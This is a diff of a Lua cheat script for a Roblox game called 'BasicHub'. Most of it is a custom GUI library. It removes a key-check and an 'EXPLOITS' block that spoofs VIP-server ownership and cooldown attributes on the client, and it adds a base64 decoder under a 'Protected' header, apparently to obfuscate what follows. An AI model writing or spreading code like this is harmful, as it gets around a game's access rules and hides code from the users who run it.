@@ -1,2638 +1,1466 @@
--- Protection
-local ProtectionConfig = { SecretKey = "TSBCode1234", HubName = "BasicHub" }
-if not _G[ProtectionConfig.SecretKey] then
-    local p = game:GetService("Players").LocalPlayer
-    if p then p:Kick("\n Unauthorized Execution \n\nUse the official BasicHub key system.") end
-    return
+-- (c) BasicHub 2026 | Protected
+local _b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+local function _d(s)
+    s=s:gsub("[^".._b.."=]","")
+    return (s:gsub(".",function(x)
+        if x=="=" then return "" end
+        local r,f="",(_b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and "1" or "0") end
+        return r
+    end):gsub("%d%d%d%d%d%d%d%d",function(x)
+        local c=0
+        for i=1,8 do c=c+(x:sub(i,i)=="1" and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
 end
-
--------------------------------------------------------------------------------
--- SERVICES
--------------------------------------------------------------------------------
-local RunService       = game:GetService("RunService")
-local TweenService     = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
-local Players          = game:GetService("Players")
-local HttpService      = game:GetService("HttpService")
-local LocalPlayer   = Players.LocalPlayer
-
--------------------------------------------------------------------------------
--- CHARACTER REFERENCES  (auto-update on respawn)
--------------------------------------------------------------------------------
-local character, humanoid, humanoidRootPart
-
-local function refreshCharacter(char)
-    character          = char
-    humanoid           = char:WaitForChild("Humanoid")
-    humanoidRootPart   = char:WaitForChild("HumanoidRootPart")
-end
-
-if LocalPlayer.Character then refreshCharacter(LocalPlayer.Character) end
-LocalPlayer.CharacterAdded:Connect(refreshCharacter)
-
--------------------------------------------------------------------------------
--- EXPLOITS  (client-side attribute unlocks used by TSB)
--------------------------------------------------------------------------------
-local function applyExploits()
-    local name = LocalPlayer.Name
-    local uid  = tostring(LocalPlayer.UserId)
-    pcall(function()
-        if workspace:GetAttribute("VIPServer")      ~= uid  then workspace:SetAttribute("VIPServer",      uid)  end
-        if workspace:GetAttribute("VIPServerOwner") ~= name then workspace:SetAttribute("VIPServerOwner", name) end
-        if workspace:GetAttribute("NoDashCooldown") == nil  then workspace:SetAttribute("NoDashCooldown", false) end
-        if workspace:GetAttribute("NoFatigue")      == nil  then workspace:SetAttribute("NoFatigue",      false) end
-        if LocalPlayer:GetAttribute("ExtraSlots")   == nil  then LocalPlayer:SetAttribute("ExtraSlots",   false) end
-        if LocalPlayer:GetAttribute("EmoteSearchBar")== nil then LocalPlayer:SetAttribute("EmoteSearchBar",false) end
-    end)
-end
-applyExploits()
-LocalPlayer.CharacterAdded:Connect(applyExploits)
-
--------------------------------------------------------------------------------
--- CUSTOM GUI LIBRARY  (Rayfield-compatible API)
--------------------------------------------------------------------------------
-local function MakeBasicHubLib()
-    local lib = {}
-
-    -- ── ScreenGui ─────────────────────────────────────────────────────────────
-    local coreGui = game:GetService("CoreGui")
-    local guiRoot
-    pcall(function()
-        if guiRoot then return end
-        local sg = Instance.new("ScreenGui")
-        sg.Name           = "BasicHub_GUI"
-        sg.ResetOnSpawn   = false
-        sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-        sg.Parent         = coreGui
-        guiRoot           = sg
-    end)
-    if not guiRoot then
-        local sg = Instance.new("ScreenGui")
-        sg.Name         = "BasicHub_GUI"
-        sg.ResetOnSpawn = false
-        sg.Parent       = LocalPlayer:WaitForChild("PlayerGui")
-        guiRoot         = sg
-    end
-
-    -- ── Dimensions & colours ──────────────────────────────────────────────────
-    local SIDEBAR_W = 148
-    local WINDOW_W  = 540
-    local WINDOW_H  = 420
-    local TOPBAR_H  = 38
-
-    local C_WIN_BG  = Color3.fromRGB(8,   10,  22 )
-    local C_TOP_BG  = Color3.fromRGB(10,  14,  28 )
-    local C_SIDE_BG = Color3.fromRGB(6,   8,   18 )
-    local C_CONT_BG = Color3.fromRGB(8,   12,  24 )
-    local C_ELEM_BG = Color3.fromRGB(14,  18,  36 )
-    local C_TEXT    = Color3.fromRGB(215, 230, 255)
-    local C_SUB     = Color3.fromRGB(130, 150, 190)
-    local C_ACCENT  = Color3.fromRGB(0,   200, 255)
-    local C_TOG_ON  = Color3.fromRGB(0,   210, 120)
-    local C_TOG_OFF = Color3.fromRGB(25,  32,  60 )
-
-    -- ── Main window ───────────────────────────────────────────────────────────
-    local MainFrame = Instance.new("Frame", guiRoot)
-    MainFrame.Name             = "MainWindow"
-    MainFrame.Size             = UDim2.new(0, WINDOW_W, 0, WINDOW_H)
-    MainFrame.Position         = UDim2.new(0.5, -WINDOW_W/2, 0.5, -WINDOW_H/2)
-    MainFrame.BackgroundColor3 = C_WIN_BG
-    MainFrame.BorderSizePixel  = 0
-    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
-
-    -- Cosmic-blue background gradient
-    local bgGrad = Instance.new("UIGradient", MainFrame)
-    bgGrad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0,   Color3.fromRGB(10, 16, 40)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(5,  8,  22)),
-        ColorSequenceKeypoint.new(1,   Color3.fromRGB(8,  18, 44)),
-    })
-    bgGrad.Rotation = 135
-
-    -- Rainbow border
-    local borderStroke = Instance.new("UIStroke", MainFrame)
-    borderStroke.Thickness       = 2
-    borderStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-    borderStroke.LineJoinMode    = Enum.LineJoinMode.Round
-    do
-        local hue = 0
-        RunService.Heartbeat:Connect(function()
-            if not borderStroke.Parent then return end
-            hue = (hue + 0.0015) % 1
-            borderStroke.Color = Color3.fromHSV(hue, 1, 1)
-        end)
-    end
-
-    -- Top bar
-    local TopBar = Instance.new("Frame", MainFrame)
-    TopBar.Size             = UDim2.new(1, 0, 0, TOPBAR_H)
-    TopBar.BackgroundColor3 = C_TOP_BG
-    TopBar.BorderSizePixel  = 0
-    Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 10)
-    local topPatch = Instance.new("Frame", TopBar)
-    topPatch.Size             = UDim2.new(1, 0, 0.5, 0)
-    topPatch.Position         = UDim2.new(0, 0, 0.5, 0)
-    topPatch.BackgroundColor3 = C_TOP_BG
-    topPatch.BorderSizePixel  = 0
-
-    local TitleLbl = Instance.new("TextLabel", TopBar)
-    TitleLbl.Size               = UDim2.new(1, -70, 1, 0)
-    TitleLbl.Position           = UDim2.new(0, 12, 0, 0)
-    TitleLbl.BackgroundTransparency = 1
-    TitleLbl.TextColor3         = C_TEXT
-    TitleLbl.Font               = Enum.Font.GothamBold
-    TitleLbl.TextSize           = 14
-    TitleLbl.TextXAlignment     = Enum.TextXAlignment.Left
-    TitleLbl.Text               = "BasicHub"
-
-    local CloseBtn = Instance.new("TextButton", TopBar)
-    CloseBtn.Size              = UDim2.new(0, 26, 0, 26)
-    CloseBtn.Position          = UDim2.new(1, -32, 0.5, -13)
-    CloseBtn.BackgroundColor3  = Color3.fromRGB(190, 40, 40)
-    CloseBtn.Text              = "✕"
-    CloseBtn.TextColor3        = Color3.fromRGB(255, 255, 255)
-    CloseBtn.Font              = Enum.Font.GothamBold
-    CloseBtn.TextSize          = 11
-    Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)
-
-    local winVisible = true
-    CloseBtn.MouseButton1Click:Connect(function()
-        MainFrame.Visible = false
-        winVisible        = false
-    end)
-
-    -- TopBar drag  (Rayfield-style: dragInput tracking + input.Changed end detection)
-    local dragToggle, dragInput, dragStart, dragStartPos = false, nil, nil, nil
-    local function applyDrag(input)
-        local delta = input.Position - dragStart
-        TweenService:Create(MainFrame, TweenInfo.new(0.025), {
-            Position = UDim2.new(
-                dragStartPos.X.Scale, dragStartPos.X.Offset + delta.X,
-                dragStartPos.Y.Scale, dragStartPos.Y.Offset + delta.Y
-            ),
-        }):Play()
-    end
-    TopBar.InputBegan:Connect(function(input)
-        if (input.UserInputType == Enum.UserInputType.MouseButton1 or
-            input.UserInputType == Enum.UserInputType.Touch) and
-            UserInputService:GetFocusedTextBox() == nil then
-            dragToggle   = true
-            dragStart    = input.Position
-            dragStartPos = MainFrame.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragToggle = false
-                end
-            end)
-        end
-    end)
-    TopBar.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement or
-           input.UserInputType == Enum.UserInputType.Touch then
-            dragInput = input
-        end
-    end)
-    UserInputService.InputChanged:Connect(function(input)
-        if input == dragInput and dragToggle then
-            applyDrag(input)
-        end
-    end)
-
-    -- K toggle
-    UserInputService.InputBegan:Connect(function(inp, gp)
-        if gp then return end
-        if inp.KeyCode == Enum.KeyCode.K then
-            winVisible        = not winVisible
-            MainFrame.Visible = winVisible
-        end
-    end)
-
-    -- Bottom drag handle  (Rayfield-style, Frame so InputBegan propagates cleanly)
-    local BottomBar = Instance.new("Frame", MainFrame)
-    BottomBar.Name             = "BottomDragBar"
-    BottomBar.Size             = UDim2.new(0, 90, 0, 18)
-    BottomBar.Position         = UDim2.new(0.5, -45, 1, -22)
-    BottomBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
-    BottomBar.BackgroundTransparency = 0.5
-    BottomBar.BorderSizePixel  = 0
-    BottomBar.ZIndex           = 8
-    Instance.new("UICorner", BottomBar).CornerRadius = UDim.new(1, 0)
-    -- Grip dots
-    for i = 1, 3 do
-        local dot = Instance.new("Frame", BottomBar)
-        dot.Size             = UDim2.new(0, 4, 0, 4)
-        dot.Position         = UDim2.new(0.5, (i - 2) * 10 - 2, 0.5, -2)
-        dot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        dot.BackgroundTransparency = 0.3
-        dot.BorderSizePixel  = 0
-        dot.ZIndex           = 9
-        Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
-    end
-
-    -- Rayfield-style drag on BottomBar
-    local bToggle, bInput, bStart, bStartPos = false, nil, nil, nil
-    local function applyBDrag(input)
-        local delta = input.Position - bStart
-        TweenService:Create(MainFrame, TweenInfo.new(0.025), {
-            Position = UDim2.new(
-                bStartPos.X.Scale, bStartPos.X.Offset + delta.X,
-                bStartPos.Y.Scale, bStartPos.Y.Offset + delta.Y
-            ),
-        }):Play()
-    end
-    BottomBar.InputBegan:Connect(function(input)
-        if (input.UserInputType == Enum.UserInputType.MouseButton1 or
-            input.UserInputType == Enum.UserInputType.Touch) and
-            UserInputService:GetFocusedTextBox() == nil then
-            bToggle   = true
-            bStart    = input.Position
-            bStartPos = MainFrame.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    bToggle = false
-                end
-            end)
-        end
-    end)
-    BottomBar.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement or
-           input.UserInputType == Enum.UserInputType.Touch then
-            bInput = input
-        end
-    end)
-    UserInputService.InputChanged:Connect(function(input)
-        if input == bInput and bToggle then
-            applyBDrag(input)
-        end
-    end)
-
-    -- Sidebar
-    local Sidebar = Instance.new("Frame", MainFrame)
-    Sidebar.Size             = UDim2.new(0, SIDEBAR_W, 1, -TOPBAR_H)
-    Sidebar.Position         = UDim2.new(0, 0, 0, TOPBAR_H)
-    Sidebar.BackgroundColor3 = C_SIDE_BG
-    Sidebar.BorderSizePixel  = 0
-    Instance.new("UICorner", Sidebar).CornerRadius = UDim.new(0, 10)
-    local sidePatch = Instance.new("Frame", Sidebar)
-    sidePatch.Size             = UDim2.new(0.5, 0, 1, 0)
-    sidePatch.Position         = UDim2.new(0.5, 0, 0, 0)
-    sidePatch.BackgroundColor3 = C_SIDE_BG
-    sidePatch.BorderSizePixel  = 0
-
-    local TabList = Instance.new("ScrollingFrame", Sidebar)
-    TabList.Size                   = UDim2.new(1, -4, 1, -8)
-    TabList.Position               = UDim2.new(0, 2, 0, 8)
-    TabList.BackgroundTransparency = 1
-    TabList.BorderSizePixel        = 0
-    TabList.ScrollBarThickness     = 0
-    TabList.CanvasSize             = UDim2.new(0, 0, 0, 0)
-    local TabLayout = Instance.new("UIListLayout", TabList)
-    TabLayout.Padding   = UDim.new(0, 2)
-    TabLayout.SortOrder = Enum.SortOrder.LayoutOrder
-    TabLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-        TabList.CanvasSize = UDim2.new(0, 0, 0, TabLayout.AbsoluteContentSize.Y + 8)
-    end)
-
-    -- Content area
-    local Content = Instance.new("Frame", MainFrame)
-    Content.Size             = UDim2.new(1, -SIDEBAR_W, 1, -TOPBAR_H)
-    Content.Position         = UDim2.new(0, SIDEBAR_W, 0, TOPBAR_H)
-    Content.BackgroundColor3 = C_CONT_BG
-    Content.BorderSizePixel  = 0
-    Instance.new("UICorner", Content).CornerRadius = UDim.new(0, 10)
-    local contPatch = Instance.new("Frame", Content)
-    contPatch.Size             = UDim2.new(0.15, 0, 1, 0)
-    contPatch.BackgroundColor3 = C_CONT_BG
-    contPatch.BorderSizePixel  = 0
-
-    -- Notification container (bottom-right of screen)
-    local NotifFrame = Instance.new("Frame", guiRoot)
-    NotifFrame.Name                   = "Notifications"
-    NotifFrame.Size                   = UDim2.new(0, 278, 1, 0)
-    NotifFrame.Position               = UDim2.new(1, -288, 0, 0)
-    NotifFrame.BackgroundTransparency = 1
-    NotifFrame.BorderSizePixel        = 0
-    local NotifLayout = Instance.new("UIListLayout", NotifFrame)
-    NotifLayout.Padding           = UDim.new(0, 6)
-    NotifLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
-    NotifLayout.SortOrder         = Enum.SortOrder.LayoutOrder
-
-    -- ── Shared helpers ────────────────────────────────────────────────────────
-    local function makeScroll()
-        local sf = Instance.new("ScrollingFrame", Content)
-        sf.Size                   = UDim2.new(1, -6, 1, -6)
-        sf.Position               = UDim2.new(0, 3, 0, 3)
-        sf.BackgroundTransparency = 1
-        sf.BorderSizePixel        = 0
-        sf.ScrollBarThickness     = 3
-        sf.ScrollBarImageColor3   = Color3.fromRGB(70, 70, 90)
-        sf.CanvasSize             = UDim2.new(0, 0, 0, 0)
-        sf.Visible                = false
-        local layout = Instance.new("UIListLayout", sf)
-        layout.Padding   = UDim.new(0, 4)
-        layout.SortOrder = Enum.SortOrder.LayoutOrder
-        local pad = Instance.new("UIPadding", sf)
-        pad.PaddingLeft   = UDim.new(0, 8)
-        pad.PaddingRight  = UDim.new(0, 8)
-        pad.PaddingTop    = UDim.new(0, 6)
-        pad.PaddingBottom = UDim.new(0, 6)
-        layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-            sf.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 14)
-        end)
-        return sf, layout
-    end
-
-    local function makeElem(parent, h)
-        local f = Instance.new("Frame", parent)
-        f.Size             = UDim2.new(1, 0, 0, h or 34)
-        f.BackgroundColor3 = C_ELEM_BG
-        f.BorderSizePixel  = 0
-        Instance.new("UICorner", f).CornerRadius = UDim.new(0, 6)
-        return f
-    end
-
-    -- ── Rayfield-compatible API ───────────────────────────────────────────────
-    function lib:CreateWindow(opts)
-        opts = opts or {}
-        TitleLbl.Text = opts.Name or "BasicHub"
-
-        local activeScroll = nil
-        local activeTabBtn = nil
-
-        local function showTab(sf, btn)
-            if activeScroll then activeScroll.Visible = false end
-            if activeTabBtn then
-                activeTabBtn.BackgroundColor3 = C_SIDE_BG
-                local l = activeTabBtn:FindFirstChildOfClass("TextLabel")
-                if l then l.TextColor3 = C_SUB end
-            end
-            sf.Visible             = true
-            btn.BackgroundColor3   = Color3.fromRGB(30, 30, 44)
-            local l = btn:FindFirstChildOfClass("TextLabel")
-            if l then l.TextColor3 = C_ACCENT end
-            activeScroll = sf
-            activeTabBtn = btn
-        end
-
-        local win      = {}
-        local tabCount = 0
-
-        function win:CreateTab(name, _icon)
-            tabCount = tabCount + 1
-            local scroll, _layout = makeScroll()
-            local elemOrder = 0
-            local function nextOrder()
-                elemOrder = elemOrder + 1
-                return elemOrder
-            end
-
-            -- Sidebar button
-            local tabBtn = Instance.new("TextButton", TabList)
-            tabBtn.Size             = UDim2.new(1, -4, 0, 30)
-            tabBtn.BackgroundColor3 = C_SIDE_BG
-            tabBtn.BorderSizePixel  = 0
-            tabBtn.Text             = ""
-            tabBtn.LayoutOrder      = tabCount
-            Instance.new("UICorner", tabBtn).CornerRadius = UDim.new(0, 6)
-
-            local tabLbl = Instance.new("TextLabel", tabBtn)
-            tabLbl.Size                   = UDim2.new(1, -10, 1, 0)
-            tabLbl.Position               = UDim2.new(0, 8, 0, 0)
-            tabLbl.BackgroundTransparency = 1
-            tabLbl.Text                   = name
-            tabLbl.TextColor3             = C_SUB
-            tabLbl.Font                   = Enum.Font.Gotham
-            tabLbl.TextSize               = 11
-            tabLbl.TextXAlignment         = Enum.TextXAlignment.Left
-
-            tabBtn.MouseButton1Click:Connect(function() showTab(scroll, tabBtn) end)
-            tabBtn.MouseEnter:Connect(function()
-                if tabBtn ~= activeTabBtn then
-                    tabBtn.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
-                end
-            end)
-            tabBtn.MouseLeave:Connect(function()
-                if tabBtn ~= activeTabBtn then
-                    tabBtn.BackgroundColor3 = C_SIDE_BG
-                end
-            end)
-
-            if tabCount == 1 then showTab(scroll, tabBtn) end
-
-            local tab = {}
-
-            function tab:CreateSection(title)
-                local f = Instance.new("Frame", scroll)
-                f.Size                   = UDim2.new(1, 0, 0, 20)
-                f.BackgroundTransparency = 1
-                f.LayoutOrder            = nextOrder()
-                local lbl = Instance.new("TextLabel", f)
-                lbl.Size                   = UDim2.new(1, -8, 1, 0)
-                lbl.Position               = UDim2.new(0, 4, 0, 0)
-                lbl.BackgroundTransparency = 1
-                lbl.Text                   = title:upper()
-                lbl.TextColor3             = C_ACCENT
-                lbl.Font                   = Enum.Font.GothamBold
-                lbl.TextSize               = 10
-                lbl.TextXAlignment         = Enum.TextXAlignment.Left
-                local line = Instance.new("Frame", f)
-                line.Size             = UDim2.new(1, 0, 0, 1)
-                line.Position         = UDim2.new(0, 0, 1, -1)
-                line.BackgroundColor3 = Color3.fromRGB(45, 45, 60)
-                line.BorderSizePixel  = 0
-            end
-
-            function tab:CreateDivider()
-                local f = Instance.new("Frame", scroll)
-                f.Size                   = UDim2.new(1, 0, 0, 8)
-                f.BackgroundTransparency = 1
-                f.LayoutOrder            = nextOrder()
-                local line = Instance.new("Frame", f)
-                line.Size             = UDim2.new(1, 0, 0, 1)
-                line.Position         = UDim2.new(0, 0, 0.5, 0)
-                line.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
-                line.BorderSizePixel  = 0
-            end
-
-            function tab:CreateLabel(text)
-                local f = makeElem(scroll, 26)
-                f.LayoutOrder            = nextOrder()
-                f.BackgroundTransparency = 0.55
-                local lbl = Instance.new("TextLabel", f)
-                lbl.Size                   = UDim2.new(1, -10, 1, 0)
-                lbl.Position               = UDim2.new(0, 6, 0, 0)
-                lbl.BackgroundTransparency = 1
-                lbl.Text                   = text
-                lbl.TextColor3             = C_SUB
-                lbl.Font                   = Enum.Font.Gotham
-                lbl.TextSize               = 11
-                lbl.TextXAlignment         = Enum.TextXAlignment.Left
-                lbl.TextWrapped            = true
-                return lbl
-            end
-
-            function tab:CreateParagraph(opts2)
-                opts2 = opts2 or {}
-                local content2 = opts2.Content or ""
-                local lineCount = 0
-                for _ in content2:gmatch("[^\n]+") do lineCount = lineCount + 1 end
-                local h = 28 + math.max(lineCount, 1) * 13
-                local f = makeElem(scroll, h)
-                f.LayoutOrder = nextOrder()
-                local tl = Instance.new("TextLabel", f)
-                tl.Size                   = UDim2.new(1, -10, 0, 18)
-                tl.Position               = UDim2.new(0, 6, 0, 4)
-                tl.BackgroundTransparency = 1
-                tl.Text                   = opts2.Title or ""
-                tl.TextColor3             = C_TEXT
-                tl.Font                   = Enum.Font.GothamBold
-                tl.TextSize               = 12
-                tl.TextXAlignment         = Enum.TextXAlignment.Left
-                local cl = Instance.new("TextLabel", f)
-                cl.Size                   = UDim2.new(1, -10, 1, -22)
-                cl.Position               = UDim2.new(0, 6, 0, 22)
-                cl.BackgroundTransparency = 1
-                cl.Text                   = content2
-                cl.TextColor3             = C_SUB
-                cl.Font                   = Enum.Font.Gotham
-                cl.TextSize               = 11
-                cl.TextXAlignment         = Enum.TextXAlignment.Left
-                cl.TextWrapped            = true
-            end
-
-            function tab:CreateButton(opts2)
-                opts2 = opts2 or {}
-                local f = makeElem(scroll, 34)
-                f.LayoutOrder = nextOrder()
-                local bar = Instance.new("Frame", f)
-                bar.Size             = UDim2.new(0, 3, 0.6, 0)
-                bar.Position         = UDim2.new(0, 0, 0.2, 0)
-                bar.BackgroundColor3 = C_ACCENT
-                bar.BorderSizePixel  = 0
-                Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 2)
-                local btn2 = Instance.new("TextButton", f)
-                btn2.Size                   = UDim2.new(1, 0, 1, 0)
-                btn2.BackgroundTransparency = 1
-                btn2.Text                   = opts2.Name or "Button"
-                btn2.TextColor3             = C_TEXT
-                btn2.Font                   = Enum.Font.GothamSemibold
-                btn2.TextSize               = 12
-                btn2.MouseButton1Click:Connect(function()
-                    TweenService:Create(f, TweenInfo.new(0.08), { BackgroundColor3 = Color3.fromRGB(36,36,50) }):Play()
-                    task.delay(0.16, function()
-                        TweenService:Create(f, TweenInfo.new(0.12), { BackgroundColor3 = C_ELEM_BG }):Play()
-                    end)
-                    if opts2.Callback then task.spawn(opts2.Callback) end
-                end)
-                btn2.MouseEnter:Connect(function()
-                    TweenService:Create(f, TweenInfo.new(0.1), { BackgroundColor3 = Color3.fromRGB(34,34,44) }):Play()
-                end)
-                btn2.MouseLeave:Connect(function()
-                    TweenService:Create(f, TweenInfo.new(0.1), { BackgroundColor3 = C_ELEM_BG }):Play()
-                end)
-                return btn2
-            end
-
-            function tab:CreateToggle(opts2)
-                opts2 = opts2 or {}
-                local val = opts2.CurrentValue or false
-                local f   = makeElem(scroll, 34)
-                f.LayoutOrder = nextOrder()
-                local lbl = Instance.new("TextLabel", f)
-                lbl.Size                   = UDim2.new(1, -50, 1, 0)
-                lbl.Position               = UDim2.new(0, 8, 0, 0)
-                lbl.BackgroundTransparency = 1
-                lbl.Text                   = opts2.Name or "Toggle"
-                lbl.TextColor3             = C_TEXT
-                lbl.Font                   = Enum.Font.Gotham
-                lbl.TextSize               = 12
-                lbl.TextXAlignment         = Enum.TextXAlignment.Left
-                local track = Instance.new("Frame", f)
-                track.Size             = UDim2.new(0, 34, 0, 18)
-                track.Position         = UDim2.new(1, -42, 0.5, -9)
-                track.BackgroundColor3 = val and C_TOG_ON or C_TOG_OFF
-                track.BorderSizePixel  = 0
-                Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)
-                local knob = Instance.new("Frame", track)
-                knob.Size             = UDim2.new(0, 14, 0, 14)
-                knob.Position         = val and UDim2.new(1,-16,0.5,-7) or UDim2.new(0,2,0.5,-7)
-                knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-                knob.BorderSizePixel  = 0
-                Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
-                local cBtn = Instance.new("TextButton", f)
-                cBtn.Size                   = UDim2.new(1, 0, 1, 0)
-                cBtn.BackgroundTransparency = 1
-                cBtn.Text                   = ""
-                cBtn.MouseButton1Click:Connect(function()
-                    val = not val
-                    TweenService:Create(track, TweenInfo.new(0.14), { BackgroundColor3 = val and C_TOG_ON or C_TOG_OFF }):Play()
-                    TweenService:Create(knob, TweenInfo.new(0.14), {
-                        Position = val and UDim2.new(1,-16,0.5,-7) or UDim2.new(0,2,0.5,-7)
-                    }):Play()
-                    if opts2.Callback then task.spawn(opts2.Callback, val) end
-                end)
-                cBtn.MouseEnter:Connect(function()
-                    TweenService:Create(f, TweenInfo.new(0.1), { BackgroundColor3 = Color3.fromRGB(32,32,42) }):Play()
-                end)
-                cBtn.MouseLeave:Connect(function()
-                    TweenService:Create(f, TweenInfo.new(0.1), { BackgroundColor3 = C_ELEM_BG }):Play()
-                end)
-                local togObj = {}
-                function togObj:SetValue(v)
-                    val = v
-                    track.BackgroundColor3 = v and C_TOG_ON or C_TOG_OFF
-                    knob.Position = v and UDim2.new(1,-16,0.5,-7) or UDim2.new(0,2,0.5,-7)
-                end
-                return togObj
-            end
-
-            function tab:CreateInput(opts2)
-                opts2 = opts2 or {}
-                local f = makeElem(scroll, 52)
-                f.LayoutOrder = nextOrder()
-                local lbl = Instance.new("TextLabel", f)
-                lbl.Size                   = UDim2.new(1, -10, 0, 20)
-                lbl.Position               = UDim2.new(0, 8, 0, 4)
-                lbl.BackgroundTransparency = 1
-                lbl.Text                   = opts2.Name or "Input"
-                lbl.TextColor3             = C_TEXT
-                lbl.Font                   = Enum.Font.Gotham
-                lbl.TextSize               = 12
-                lbl.TextXAlignment         = Enum.TextXAlignment.Left
-                local holder = Instance.new("Frame", f)
-                holder.Size             = UDim2.new(1, -16, 0, 24)
-                holder.Position         = UDim2.new(0, 8, 0, 22)
-                holder.BackgroundColor3 = Color3.fromRGB(13, 13, 17)
-                holder.BorderSizePixel  = 0
-                Instance.new("UICorner", holder).CornerRadius = UDim.new(0, 5)
-                local iStroke = Instance.new("UIStroke", holder)
-                iStroke.Thickness = 1
-                iStroke.Color     = Color3.fromRGB(46, 46, 62)
-                local tb = Instance.new("TextBox", holder)
-                tb.Size                   = UDim2.new(1, -8, 1, 0)
-                tb.Position               = UDim2.new(0, 4, 0, 0)
-                tb.BackgroundTransparency = 1
-                tb.Text                   = ""
-                tb.PlaceholderText        = opts2.PlaceholderText or ""
-                tb.PlaceholderColor3      = Color3.fromRGB(85, 85, 105)
-                tb.TextColor3             = C_TEXT
-                tb.Font                   = Enum.Font.Gotham
-                tb.TextSize               = 12
-                tb.TextXAlignment         = Enum.TextXAlignment.Left
-                tb.ClearTextOnFocus       = false
-                tb.ClipsDescendants       = true
-                tb.Focused:Connect(function()
-                    TweenService:Create(iStroke, TweenInfo.new(0.12), { Color = C_ACCENT }):Play()
-                end)
-                tb.FocusLost:Connect(function()
-                    TweenService:Create(iStroke, TweenInfo.new(0.12), { Color = Color3.fromRGB(46,46,62) }):Play()
-                    if opts2.RemoveTextAfterFocusLost then tb.Text = "" end
-                    if opts2.Callback then task.spawn(opts2.Callback, tb.Text) end
-                end)
-                return tb
-            end
-
-            function tab:CreateSlider(opts2)
-                opts2 = opts2 or {}
-                local rMin = (opts2.Range and opts2.Range[1]) or 0
-                local rMax = (opts2.Range and opts2.Range[2]) or 100
-                local inc  = opts2.Increment or 1
-                local sVal = opts2.CurrentValue or rMin
-                local f    = makeElem(scroll, 52)
-                f.LayoutOrder = nextOrder()
-                local lbl = Instance.new("TextLabel", f)
-                lbl.Size                   = UDim2.new(1, -55, 0, 20)
-                lbl.Position               = UDim2.new(0, 8, 0, 4)
-                lbl.BackgroundTransparency = 1
-                lbl.Text                   = opts2.Name or "Slider"
-                lbl.TextColor3             = C_TEXT
-                lbl.Font                   = Enum.Font.Gotham
-                lbl.TextSize               = 12
-                lbl.TextXAlignment         = Enum.TextXAlignment.Left
-                local valLbl = Instance.new("TextLabel", f)
-                valLbl.Size                   = UDim2.new(0, 50, 0, 20)
-                valLbl.Position               = UDim2.new(1, -54, 0, 4)
-                valLbl.BackgroundTransparency = 1
-                valLbl.Text                   = tostring(sVal)
-                valLbl.TextColor3             = C_ACCENT
-                valLbl.Font                   = Enum.Font.GothamBold
-                valLbl.TextSize               = 11
-                valLbl.TextXAlignment         = Enum.TextXAlignment.Right
-                local trackBG = Instance.new("Frame", f)
-                trackBG.Size             = UDim2.new(1, -16, 0, 5)
-                trackBG.Position         = UDim2.new(0, 8, 0, 34)
-                trackBG.BackgroundColor3 = Color3.fromRGB(38, 38, 52)
-                trackBG.BorderSizePixel  = 0
-                Instance.new("UICorner", trackBG).CornerRadius = UDim.new(1, 0)
-                local fill = Instance.new("Frame", trackBG)
-                fill.Size             = UDim2.new((sVal-rMin)/math.max(rMax-rMin,0.001), 0, 1, 0)
-                fill.BackgroundColor3 = C_ACCENT
-                fill.BorderSizePixel  = 0
-                Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
-                local function setSVal(v)
-                    v = math.clamp(math.floor(v/inc+0.5)*inc, rMin, rMax)
-                    sVal = v
-                    valLbl.Text = tostring(v)
-                    fill.Size = UDim2.new((v-rMin)/math.max(rMax-rMin,0.001), 0, 1, 0)
-                    if opts2.Callback then task.spawn(opts2.Callback, v) end
-                end
-                local sliding = false
-                local hitbox = Instance.new("TextButton", trackBG)
-                hitbox.Size                   = UDim2.new(1, 0, 0, 16)
-                hitbox.Position               = UDim2.new(0, 0, 0.5, -8)
-                hitbox.BackgroundTransparency = 1
-                hitbox.Text                   = ""
-                hitbox.ZIndex                 = 5
-                hitbox.MouseButton1Down:Connect(function() sliding = true end)
-                UserInputService.InputChanged:Connect(function(inp)
-                    if sliding and inp.UserInputType == Enum.UserInputType.MouseMovement then
-                        local abs = trackBG.AbsolutePosition
-                        local w   = trackBG.AbsoluteSize.X
-                        setSVal(rMin + (rMax-rMin) * math.clamp((inp.Position.X-abs.X)/w, 0, 1))
-                    end
-                end)
-                UserInputService.InputEnded:Connect(function(inp)
-                    if inp.UserInputType == Enum.UserInputType.MouseButton1 then
-                        sliding = false
-                    end
-                end)
-                local slObj = {}
-                function slObj:SetValue(v) setSVal(v) end
-                return slObj
-            end
-
-            return tab
-        end -- CreateTab
-
-        return win
-    end -- CreateWindow
-
-    -- ── Notify ────────────────────────────────────────────────────────────────
-    function lib:Notify(opts)
-        opts = opts or {}
-        local ntitle   = opts.Title    or "Notification"
-        local ncontent = opts.Content  or ""
-        local ndur     = opts.Duration or 4
-
